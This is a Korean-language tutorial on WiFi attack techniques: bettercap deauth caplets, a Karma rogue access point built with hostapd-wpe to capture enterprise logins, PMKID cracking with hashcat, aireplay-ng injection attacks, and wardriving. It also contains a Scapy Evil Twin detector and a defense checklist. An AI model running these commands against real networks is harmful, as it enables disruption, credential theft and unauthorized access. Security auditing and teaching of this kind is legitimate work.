# 고급 WiFi 공격 기법

## 1. Bettercap - MITM 자동화


`bettercap`은 MITM 공격을 위한 고급 프레임워크입니다. ARP 스푸핑, DNS 스푸핑, SSL 스트리핑, HTTP 트래픽 인젝션을 단일 도구로 수행하며, 커피숍 Wi-Fi 보안 감사 시나리오에서 활용합니다.

```bash
# Bettercap 설치
sudo apt install bettercap

# Bettercap 실행 (무선)
sudo bettercap -iface wlan0mon

# 대화형 모드 명령어
wifi.recon on                          # WiFi 정찰 시작
wifi.show                              # AP 목록 표시
wifi.assoc AA:BB:CC:DD:EE:FF          # 특정 AP 타겟
wifi.deauth AA:BB:CC:DD:EE:FF         # Deauth 전송

# Caplet(자동화 스크립트) 실행
sudo bettercap -iface wlan0mon -caplet wifi_attack.cap
```

```
# wifi_attack.cap
set wifi.interface wlan0mon
set wifi.handshakes.file /tmp/handshakes.pcap

wifi.recon on
events.ignore wifi.client.probe

set $ {green}{env.iface.name}{reset} > {bold}{net.proto}{reset} {bold}{net.dst}{reset}

# 5분마다 Deauth 전송
set ticker.commands "wifi.deauth"
set ticker.period 300
ticker on
```

---

## 2. Airgeddon - 올인원 WiFi 공격 프레임워크

airgeddon은 Evil Twin, 핸드셰이크 캡처, DoS 등 다양한 무선 공격을 메뉴 기반으로 자동화합니다. 초보자도 쉽게 무선 공격을 수행할 수 있습니다.

```bash
# 설치
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# 메뉴 구조:
# 1. 인터페이스 선택
# 2. 모니터 모드 전환
# 3. WPA 공격
#    3a. 핸드셰이크 캡처
#    3b. Offline cracking
#    3c. Evil Twin 공격
# 4. WPS 공격
# 5. WEP 공격
# 6. 기업 네트워크 공격
# 7. DoS 공격
```

---

## 3. Karma 공격 (자동 AP 연결)

### Probe Request 기반 공격

```
원리:
클라이언트는 연결했던 AP를 기억하고
Probe Request 브로드캐스트 전송

Karma:
모든 Probe Request에 응답
→ 클라이언트가 자동으로 연결
→ MITM 위치 확보
```

Karma 공격으로 클라이언트의 Probe Request에 응답하여 자동 연결을 유도합니다. 클라이언트가 알려진 네트워크로 착각하여 가짜 AP에 연결합니다.

```bash
# Hostapd-WPE (Karma 모드)
cat > /etc/hostapd-wpe/karma.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g

# Karma 설정
karma=1                    # Karma 모드 활성화
karma_black_ssids_file=/etc/hostapd-wpe/karma.black  # 블랙리스트

# 기업 인증 (WPA Enterprise)
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.pem
EOF

sudo hostapd-wpe karma.conf
```

---

## 4. PMKID + GPU 클러스터 크래킹

PMKID 공격은 클라이언트 연결 없이도 AP에서 PMKID를 추출하여 WPA2 키를 오프라인으로 크래킹합니다. 2018년 발견된 기법으로 핸드셰이크 캡처보다 효율적입니다.

```bash
# 여러 GPU를 가진 시스템 설정
# hashcat 자동으로 모든 GPU 활용
hashcat -m 22000 pmkid.hc22000 rockyou.txt

# 특정 GPU 선택
hashcat -m 22000 pmkid.hc22000 rockyou.txt -d 1,2,3  # GPU 1,2,3 사용

# 원격 크래킹 서버 설정 (Hashtopolis)
docker run --gpus all \
    -p 7070:7070 \
    -v /data:/data \
    hashtopolis/hashtopolis-server

# 에이전트 설정
python3 hashtopolis.zip \
    --server http://CRACK_SERVER:7070 \
    --token API_TOKEN
```

---

## 5. 드라이브바이 무선 스캔 (Wardriving)

Kismet과 GPS를 결합하여 지역 무선 네트워크를 지도에 기록합니다. 이동하며 AP 정보를 수집하고 지리적 분포를 시각화합니다.

```bash
# Kismet + GPS로 지도 작성
sudo apt install kismet gpsd

# GPS 데몬 시작
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock

# Kismet + GPS 연동
cat >> /etc/kismet/kismet.conf << 'EOF'
source=wlan0mon:name=wifi
gps=gpsd:host=localhost,port=2947
EOF

sudo kismet

# WiGLE 업로드 형식 변환
kismetdb_to_wiglecsv --in wardriving.kismet --out wardriving.csv

# Python으로 GPS 기반 히트맵 생성
pip install folium pandas
```

```python
#!/usr/bin/env python3
"""
Kismet/WiGLE CSV → 무선 네트워크 분석 및 히트맵 생성 CLI
사용: python3 wardriving_analyze.py --csv wardriving.csv --out wifi_map.html [--filter WPA2] [--center 37.56,126.97]
"""

from __future__ import annotations

import argparse
import json
import sys
from collections import Counter
from pathlib import Path
from typing import Optional

try:
    import pandas as pd
    HAS_PANDAS = True
except ImportError:
    HAS_PANDAS = False

try:
    import folium
    from folium.plugins import HeatMap, MarkerCluster
    HAS_FOLIUM = True
except ImportError:
    HAS_FOLIUM = False


# WiGLE/Kismet CSV 컬럼 (WiGLE 1.4 형식)
_WIGLE_COLUMNS = [
    "WigleWifi", "appRelease", "model", "release",
    "device", "display", "board", "brand", "star",
    "MAC", "SSID", "AuthMode", "FirstSeen", "Channel",
    "RSSI", "CurrentLatitude", "CurrentLongitude",
    "AltitudeMeters", "AccuracyMeters", "Type",
]


def load_wigle_csv(csv_path: Path) -> "pd.DataFrame":
    """WiGLE/Kismet CSV 로드 (헤더 자동 감지)"""
    # 첫 줄이 메타데이터인 경우 건너뜀
    with open(csv_path, encoding="utf-8", errors="replace") as fh:
        first_line = fh.readline()
    skip = 1 if "WigleWifi" in first_line or "appRelease" in first_line else 0

    df = pd.read_csv(
        csv_path,
        skiprows=skip,
        names=_WIGLE_COLUMNS,
        on_bad_lines="skip",
        encoding="utf-8",
        errors="replace",
    )
    return df


def clean_df(df: "pd.DataFrame") -> "pd.DataFrame":
    """좌표 정리 및 숫자 변환"""
    df = df.copy()
    for col in ("CurrentLatitude", "CurrentLongitude", "RSSI", "Channel"):
        df[col] = pd.to_numeric(df[col], errors="coerce")

    df = df.dropna(subset=["CurrentLatitude", "CurrentLongitude"])
    df = df[df["CurrentLatitude"] != 0.0]
    df = df[df["CurrentLongitude"] != 0.0]
    return df


def analyze(df: "pd.DataFrame") -> dict:
    total = len(df)
    enc_counts = Counter(df["AuthMode"].fillna("UNKNOWN"))
    channel_counts = Counter(df["Channel"].dropna().astype(int))
    ssid_counts = Counter(df["SSID"].fillna("(hidden)"))

    return {
        "total": total,
        "enc_distribution": dict(enc_counts.most_common(10)),
        "top_channels": dict(channel_counts.most_common(10)),
        "top_ssids": dict(ssid_counts.most_common(10)),
        "avg_rssi": float(df["RSSI"].mean()) if not df["RSSI"].isna().all() else 0.0,
        "open_networks": int((df["AuthMode"].str.contains("OPN|NONE|OPEN", case=False, na=False)).sum()),
        "wpa3_count": int((df["AuthMode"].str.contains("WPA3|SAE", case=False, na=False)).sum()),
    }


def build_map(
    df: "pd.DataFrame",
    center: tuple[float, float],
    zoom: int = 13,
    filter_enc: Optional[str] = None,
) -> "folium.Map":
    m = folium.Map(location=list(center), zoom_start=zoom, tiles="CartoDB positron")

    if filter_enc:
        filtered = df[df["AuthMode"].str.contains(filter_enc, case=False, na=False)]
    else:
        filtered = df

    # 히트맵 레이어
    heat_data = list(zip(
        filtered["CurrentLatitude"].tolist(),
        filtered["CurrentLongitude"].tolist(),
    ))
    HeatMap(heat_data, radius=10, blur=15, max_zoom=1).add_to(m)

    # 오픈 네트워크 마커 (위험)
    open_nets = df[df["AuthMode"].str.contains("OPN|NONE|OPEN", case=False, na=False)]
    if not open_nets.empty:
        open_cluster = MarkerCluster(name="오픈 네트워크 (위험)").add_to(m)
        for _, row in open_nets.iterrows():
            folium.Marker(
                location=[row["CurrentLatitude"], row["CurrentLongitude"]],
                popup=f"SSID: {row['SSID']}<br>MAC: {row['MAC']}<br>CH: {row['Channel']}",
                icon=folium.Icon(color="red", icon="wifi", prefix="fa"),
            ).add_to(open_cluster)

    folium.LayerControl().add_to(m)
    return m


def print_analysis(stats: dict, as_json: bool = False) -> None:
    if as_json:
        print(json.dumps(stats, ensure_ascii=False, indent=2))
        return

    print(f"\n{'='*60}")
    print(f"총 AP 수     : {stats['total']:,}")
    print(f"오픈 네트워크: {stats['open_networks']:,}개 (취약)")
    print(f"WPA3 네트워크: {stats['wpa3_count']:,}개")
    print(f"평균 RSSI    : {stats['avg_rssi']:.1f} dBm")

    print("\n[암호화 분포]")
    for enc, cnt in stats["enc_distribution"].items():
        bar = "#" * min(cnt * 30 // (stats["total"] or 1), 30)
        print(f"  {enc:<30} {bar} {cnt}")

    print("\n[상위 채널]")
    for ch, cnt in stats["top_channels"].items():
        print(f"  CH {ch:>3}: {cnt}개")

    print("\n[상위 SSID]")
    for ssid, cnt in stats["top_ssids"].items():
        print(f"  {ssid:<40} {cnt}개")


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Kismet/WiGLE CSV 무선 네트워크 분석 및 히트맵 생성기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n"
               "  python3 wardriving_analyze.py --csv wardriving.csv\n"
               "  python3 wardriving_analyze.py --csv wardriving.csv --out map.html --filter WPA2\n"
               "  python3 wardriving_analyze.py --csv wardriving.csv --center 37.56,126.97 --json",
    )
    parser.add_argument("--csv", required=True, metavar="FILE", help="WiGLE/Kismet CSV 파일")
    parser.add_argument("--out", default="wifi_heatmap.html", metavar="FILE",
                        help="출력 HTML 파일 (기본: wifi_heatmap.html)")
    parser.add_argument("--filter", metavar="ENC",
                        help="암호화 필터 (예: WPA2, WPA3, OPEN)")
    parser.add_argument("--center", metavar="LAT,LON", default="37.5665,126.9780",
                        help="지도 중심 좌표 (기본: 서울)")
    parser.add_argument("--zoom", type=int, default=13, help="초기 줌 레벨 (기본: 13)")
    parser.add_argument("--json", action="store_true", help="통계를 JSON으로 출력")
    parser.add_argument("--no-map", action="store_true", help="지도 파일 생성 건너뜀")
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if not HAS_PANDAS:
        print("pandas 라이브러리 필요: pip install pandas", file=sys.stderr)
        sys.exit(1)

    csv_path = Path(args.csv)
    if not csv_path.exists():
        parser.error(f"파일 없음: {csv_path}")

    print(f"[*] CSV 로드 중: {csv_path}", file=sys.stderr)
    df = load_wigle_csv(csv_path)
    df = clean_df(df)
    print(f"[*] 유효 레코드: {len(df):,}개", file=sys.stderr)

    stats = analyze(df)
    print_analysis(stats, as_json=args.json)

    if not args.no_map:
        if not HAS_FOLIUM:
            print("[경고] folium 없음, 지도 생성 건너뜀: pip install folium", file=sys.stderr)
        else:
            try:
                lat_str, lon_str = args.center.split(",")
                center = (float(lat_str), float(lon_str))
            except ValueError:
                parser.error("--center 형식: 위도,경도 (예: 37.56,126.97)")

            m = build_map(df, center=center, zoom=args.zoom, filter_enc=args.filter)
            out_path = Path(args.out)
            m.save(str(out_path))
            print(f"\n[+] 히트맵 저장: {out_path} ({len(df):,}개 AP)")


if __name__ == "__main__":
    main()
```

---

## 6. 채널 호핑 및 5GHz 공격

5GHz 대역의 무선 네트워크를 스캔합니다. 2.4GHz보다 짧은 범위를 가지지만 채널 수가 많고 혼잡도가 낮습니다. 지원 어댑터가 필요합니다.

```bash
# 5GHz 대역 스캔
sudo airodump-ng --band a wlan0mon  # 5GHz only
sudo airodump-ng --band abg wlan0mon  # 2.4+5GHz

# 채널 호핑 커스텀
sudo airodump-ng --channel 36,40,44,48,149,153,157,161 wlan0mon

# 5GHz Deauth (주의: 일부 드라이버 미지원)
sudo aireplay-ng --deauth 10 -a BSSID -c CLIENT wlan0mon

# 5GHz 지원 어댑터 확인
iw dev wlan0 info
iw phy phy0 info | grep -A5 "Band 2"  # 5GHz 지원 여부
```

---

## 7. 무선 패킷 주입 테스트

무선 어댑터의 패킷 주입 기능을 테스트합니다. 주입이 가능해야 Deauth 공격, 재연결 유도, ARP 리플레이 등의 공격을 수행할 수 있습니다.

```bash
# 주입 가능 여부 테스트
sudo aireplay-ng --test wlan0mon

# 패킷 주입 공격 유형
aireplay-ng -0 10 -a BSSID wlan0mon           # Deauthentication
aireplay-ng -1 0 -a BSSID -h HMAC wlan0mon    # Fake Authentication
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon  # Interactive
aireplay-ng -3 -b BSSID -h HMAC wlan0mon      # ARP Request Replay
aireplay-ng -4 -b BSSID -h HMAC wlan0mon      # KoreK Chopchop (WEP)
aireplay-ng -5 -b BSSID -h HMAC wlan0mon      # Fragmentation (WEP)
aireplay-ng -6 -b BSSID -h HMAC wlan0mon      # Cafe-Latte (WEP)
aireplay-ng -7 -b BSSID -h HMAC wlan0mon      # Hirte (WEP Client)
aireplay-ng -8 -b BSSID wlan0mon              # WPA Migration
aireplay-ng -9 wlan0mon                       # Injection Test
```

---

## 8. Scapy로 무선 패킷 분석/생성

```python
#!/usr/bin/env python3
"""
Evil Twin AP 탐지 도구 — 합법적 AP와 동일한 SSID를 가진 가짜 AP 탐지
사용: sudo python3 evil_twin_detect.py --iface wlan0mon [--whitelist whitelist.json] [--timeout 60]
"""

from __future__ import annotations

import argparse
import json
import signal
import sys
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    from scapy.all import sniff, sendp, RandMAC
    from scapy.layers.dot11 import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
        Dot11ProbeReq, RadioTap,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ------------------------------------------------------------------ #
#  데이터 구조
# ------------------------------------------------------------------ #
@dataclass
class APRecord:
    bssid: str
    ssid: str
    channel: int
    rssi: int
    enc: str
    vendor: str = ""
    first_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
    last_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))


@dataclass
class EvilTwinAlert:
    timestamp: str
    ssid: str
    legitimate_bssid: str
    rogue_bssid: str
    legitimate_channel: int
    rogue_channel: int
    rogue_rssi: int
    enc_mismatch: bool
    detail: str


# ------------------------------------------------------------------ #
#  Evil Twin 탐지기
# ------------------------------------------------------------------ #
class EvilTwinDetector:
    def __init__(
        self,
        iface: str,
        whitelist: Optional[dict[str, str]] = None,
    ) -> None:
        """
        whitelist: {bssid: ssid} — 신뢰할 수 있는 합법적 AP 목록
        """
        self.iface = iface
        self.whitelist: dict[str, str] = {
            k.lower(): v for k, v in (whitelist or {}).items()
        }
        # SSID → {bssid: APRecord}
        self._by_ssid: dict[str, dict[str, APRecord]] = defaultdict(dict)
        self.alerts: list[EvilTwinAlert] = []
        self._stop = False

    # ── 패킷 처리 ─────────────────────────────────────────────────────
    def _extract_beacon_info(self, pkt) -> Optional[tuple]:
        """(bssid, ssid, channel, rssi, enc) 추출"""
        dot11 = pkt[Dot11]
        bssid = (dot11.addr2 or "").lower()
        if not bssid:
            return None

        ssid, channel, enc = "", 0, "OPEN"
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:
                try:
                    ssid = elt.info.decode("utf-8", errors="replace").strip("\x00")
                except Exception:
                    pass
            elif elt.ID == 3:
                try:
                    channel = int.from_bytes(elt.info, "little")
                except Exception:
                    pass
            elif elt.ID == 48:
                enc = "WPA2"
            elif elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":
                if enc != "WPA2":
                    enc = "WPA"
            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

        rssi = 0
        if pkt.haslayer(RadioTap):
            rssi = getattr(pkt[RadioTap], "dBm_AntSignal", 0) or 0

        return bssid, ssid or "(hidden)", channel, rssi, enc

    def _handle(self, pkt) -> None:
        if not (pkt.haslayer(Dot11) and pkt.haslayer(Dot11Beacon)):
            return

        info = self._extract_beacon_info(pkt)
        if info is None:
            return

        bssid, ssid, channel, rssi, enc = info
        now = datetime.now().strftime("%H:%M:%S")

        # 기록 갱신
        if bssid in self._by_ssid[ssid]:
            self._by_ssid[ssid][bssid].last_seen = now
            self._by_ssid[ssid][bssid].rssi = rssi
        else:
            self._by_ssid[ssid][bssid] = APRecord(
                bssid=bssid, ssid=ssid, channel=channel,
                rssi=rssi, enc=enc,
            )
            print(f"  [새 AP] {ssid:<30} {bssid}  CH:{channel:2d}  {enc}  {rssi}dBm")

        # Evil Twin 분석
        self._check_evil_twin(ssid, bssid, channel, rssi, enc)

    def _check_evil_twin(
        self, ssid: str, bssid: str, channel: int, rssi: int, enc: str
    ) -> None:
        peers = self._by_ssid.get(ssid, {})
        if len(peers) < 2:
            return  # 동일 SSID AP가 1개뿐이면 분석 불필요

        # 화이트리스트에 있는 합법적 BSSID 찾기
        legitimate = {b: ap for b, ap in peers.items() if b in self.whitelist}
        all_aps = list(peers.values())

        if legitimate:
            for legit_bssid, legit_ap in legitimate.items():
                for ap in all_aps:
                    if ap.bssid == legit_bssid:
                        continue
                    # 다른 채널이거나 암호화 방식이 다를 때 의심
                    chan_diff = abs(ap.channel - legit_ap.channel)
                    enc_mismatch = ap.enc != legit_ap.enc
                    if chan_diff > 0 or enc_mismatch:
                        self._raise_alert(
                            ssid=ssid,
                            legit=legit_ap,
                            rogue=ap,
                            enc_mismatch=enc_mismatch,
                        )
        else:
            # 화이트리스트 없음: 동일 SSID 다채널 AP를 경고
            if len(peers) >= 2:
                channels = {ap.channel for ap in all_aps}
                if len(channels) > 1:
                    first, *rest = all_aps
                    for rogue in rest:
                        if rogue.channel != first.channel:
                            self._raise_alert(
                                ssid=ssid, legit=first, rogue=rogue,
                                enc_mismatch=first.enc != rogue.enc,
                            )

    def _raise_alert(
        self, ssid: str, legit: APRecord, rogue: APRecord, enc_mismatch: bool
    ) -> None:
        # 중복 알림 방지
        for existing in self.alerts:
            if existing.ssid == ssid and existing.rogue_bssid == rogue.bssid:
                return

        reasons = []
        if abs(rogue.channel - legit.channel) > 0:
            reasons.append(f"채널 불일치 (합법:{legit.channel} vs 의심:{rogue.channel})")
        if enc_mismatch:
            reasons.append(f"암호화 불일치 (합법:{legit.enc} vs 의심:{rogue.enc})")

        detail = " | ".join(reasons) if reasons else "동일 SSID 중복 감지"

        alert = EvilTwinAlert(
            timestamp=datetime.now().strftime("%H:%M:%S"),
            ssid=ssid,
            legitimate_bssid=legit.bssid,
            rogue_bssid=rogue.bssid,
            legitimate_channel=legit.channel,
            rogue_channel=rogue.channel,
            rogue_rssi=rogue.rssi,
            enc_mismatch=enc_mismatch,
            detail=detail,
        )
        self.alerts.append(alert)
        print(
            f"\n  \033[91m[!!! EVIL TWIN 의심 !!!]\033[0m SSID='{ssid}'\n"
            f"    합법적 AP : {legit.bssid}  CH:{legit.channel}  {legit.enc}\n"
            f"    의심 AP   : {rogue.bssid}  CH:{rogue.channel}  {rogue.enc}  RSSI:{rogue.rssi}dBm\n"
            f"    이유      : {detail}\n"
        )

    # ── 실행 ─────────────────────────────────────────────────────────
    def start(self, timeout: int = 0) -> None:
        signal.signal(signal.SIGINT, lambda s, f: setattr(self, "_stop", True))
        print(f"[*] Evil Twin 탐지 시작: {self.iface}", file=sys.stderr)
        sniff(
            iface=self.iface,
            prn=self._handle,
            store=False,
            timeout=timeout if timeout > 0 else None,
            stop_filter=lambda _: self._stop,
        )

    def print_summary(self) -> None:
        total_ssids = len(self._by_ssid)
        total_aps = sum(len(v) for v in self._by_ssid.values())
        print(f"\n{'='*65}")
        print(f"스캔 결과: SSID {total_ssids}개 / AP {total_aps}개")
        print(f"Evil Twin 의심 경보: {len(self.alerts)}건")
        if self.alerts:
            print()
            for a in self.alerts:
                print(f"  [{a.timestamp}] SSID='{a.ssid}'")
                print(f"    합법: {a.legitimate_bssid} CH:{a.legitimate_channel}")
                print(f"    의심: {a.rogue_bssid} CH:{a.rogue_channel} ({a.detail})")


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Evil Twin AP 탐지 도구 (Scapy 기반)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="화이트리스트 JSON 형식:\n"
               '  {"aa:bb:cc:dd:ee:ff": "MyCorpWiFi", ...}\n\n'
               "예시:\n"
               "  sudo python3 evil_twin_detect.py --iface wlan0mon\n"
               "  sudo python3 evil_twin_detect.py --iface wlan0mon --whitelist known_aps.json --timeout 120",
    )
    parser.add_argument("--iface", required=True, help="모니터 모드 인터페이스")
    parser.add_argument(
        "--whitelist", metavar="FILE",
        help="신뢰할 수 있는 AP 목록 JSON 파일 ({bssid: ssid})",
    )
    parser.add_argument(
        "--timeout", type=int, default=0,
        metavar="SEC",
        help="탐지 시간(초). 0=무한 (기본: 0)",
    )
    return parser


def main() -> None:
    if not HAS_SCAPY:
        print("scapy 라이브러리 필요: pip install scapy", file=sys.stderr)
        sys.exit(1)

    parser = build_parser()
    args = parser.parse_args()

    whitelist: dict[str, str] = {}
    if args.whitelist:
        wl_path = Path(args.whitelist)
        if not wl_path.exists():
            parser.error(f"화이트리스트 파일 없음: {wl_path}")
        try:
            whitelist = json.loads(wl_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError) as exc:
            parser.error(f"화이트리스트 파일 오류: {exc}")
        print(f"[*] 화이트리스트 로드: {len(whitelist)}개 AP", file=sys.stderr)

    detector = EvilTwinDetector(iface=args.iface, whitelist=whitelist)
    detector.start(timeout=args.timeout)
    detector.print_summary()


if __name__ == "__main__":
    main()
```

---

## 9. 무선 보안 평가 자동화


배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# wifi_pentest.sh - 무선 침투 테스트 자동화

INTERFACE=$1
OUTPUT_DIR="./wifi_scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# 모니터 모드 활성화
echo "[1/5] 모니터 모드 활성화..."
airmon-ng check kill
airmon-ng start $INTERFACE
MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
echo "[+] 모니터 인터페이스: $MON_IFACE"

# AP 스캔 (30초)
echo "[2/5] AP 스캔 중 (30초)..."
timeout 30 airodump-ng $MON_IFACE \
    --write $OUTPUT_DIR/scan \
    --output-format csv,cap 2>/dev/null

# CSV 파싱
echo "[3/5] 결과 분석..."
awk -F',' 'NR>2 && NF>5 {
    bssid=$1; channel=$4; enc=$6; ssid=$14
    gsub(/ /, "", bssid); gsub(/ /, "", channel)
    gsub(/ /, "", enc); gsub(/^ | $/, "", ssid)
    if (bssid != "") 
        print bssid, channel, enc, ssid
}' $OUTPUT_DIR/scan-01.csv | sort -u > $OUTPUT_DIR/targets.txt

echo "발견된 AP:"
cat $OUTPUT_DIR/targets.txt

# WPS 스캔
echo "[4/5] WPS 활성화 AP 스캔..."
timeout 30 wash -i $MON_IFACE -o $OUTPUT_DIR/wps_scan.txt 2>/dev/null

# 요약 보고서
echo "[5/5] 보고서 생성..."
cat > $OUTPUT_DIR/summary.md << EOF
# WiFi 침투 테스트 결과

## 스캔 정보
- 날짜: $(date)
- 인터페이스: $INTERFACE

## 발견된 네트워크
\`\`\`
$(cat $OUTPUT_DIR/targets.txt)
\`\`\`

## WPS 활성화 AP
\`\`\`
$(cat $OUTPUT_DIR/wps_scan.txt 2>/dev/null || echo "없음")
\`\`\`

## 다음 단계
- WPA2 핸드셰이크 수집 대상 선정
- WPS 활성화 AP Pixie Dust 공격 시도
- Evil Twin 공격 계획
EOF

echo "[완료] 결과: $OUTPUT_DIR/"

# 정리
airmon-ng stop $MON_IFACE
service NetworkManager restart
```

---

## 10. 방어 전략

```
무선 네트워크 보안 강화:
  □ WPA3 Personal/Enterprise 사용
  □ 강력한 비밀번호 (20자 이상, 특수문자 포함)
  □ WPS 비활성화
  □ 숨겨진 SSID (기본적 보안만, 우회 가능)
  □ MAC 주소 필터링 (추가적 보안층)
  □ 무선 IDS (WIDS) 배포 - Deauth 탐지
  □ 802.1X Enterprise 인증 (기업 환경)
  □ RADIUS 서버 인증서 검증 활성화
  □ VLAN 세분화 (게스트/업무 분리)
  □ 주기적 무선 감사 (Kismet으로 불법 AP 탐지)

무선 IDS 설정 (Kismet):
  alert=APSPOOF,5/min,10/sec
  alert=DISCONPACKET,10/min,20/sec  # Deauth 탐지
  alert=PROBENOJOIN,5/min,10/sec
```
